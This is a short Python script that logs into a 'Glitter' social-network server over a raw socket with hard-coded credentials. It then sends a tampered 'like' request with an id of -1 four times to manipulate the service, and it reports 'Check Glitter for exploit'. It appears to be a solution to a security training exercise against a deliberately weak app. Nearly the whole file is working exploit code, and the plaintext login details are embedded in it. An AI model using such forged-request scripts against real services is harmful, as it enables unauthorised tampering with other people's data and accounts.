import socket

GLITTER_IP = '44.224.228.136'
GLITTER_PORT = 1336

LOGIN_REQ = b'100#{gli&&er}{"user_name":"Agustus","password":"portal300","enable_push_notifications":true}##'
CHECKSUM_REQ = b'110#{gli&&er}1553##'

SUCCESSFUL_LOGIN_ID = '105'
SUCCESSFUL_CHECKSUM_ID = '115'

LIKE_EXPLOIT = b'710#{gli&&er}{"glit_id":518,"user_id":84,"user_screen_name":"Agustus Portal","id":-1}##'

def main():
    try:
        #Creating socket with Glitter.
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

            # Connecting to the server.
            glitter_address = (GLITTER_IP, GLITTER_PORT)
            sock.connect(glitter_address)

            # Login to server.
            sock.sendall(LOGIN_REQ)
            response = sock.recv(1024).decode()

            # Checking if the login was successful.
            if SUCCESSFUL_LOGIN_ID not in response:
                print(f'\033[91m[ERROR]: \033[0m Login Failed!')
                return None

            # Sending the checksum to server.
            sock.sendall(CHECKSUM_REQ)
            response = sock.recv(1024).decode()

            # Checking if we had successfully logged into the server.
            if SUCCESSFUL_CHECKSUM_ID not in response:
                print(f'\033[91m[ERROR]: \033[0m Login Failed!')
                return None

            
            sock.sendall(LIKE_EXPLOIT)
            sock.sendall(LIKE_EXPLOIT)
            sock.sendall(LIKE_EXPLOIT)
            sock.sendall(LIKE_EXPLOIT)

            print(f'\033[92m[SUCCESS]: \033Check Glitter for exploit')
            
    except Exception as err:
        print(f'\033[91m[ERROR]: \033[0m{err}')
        return None
        

if __name__ == '__main__':
    main()
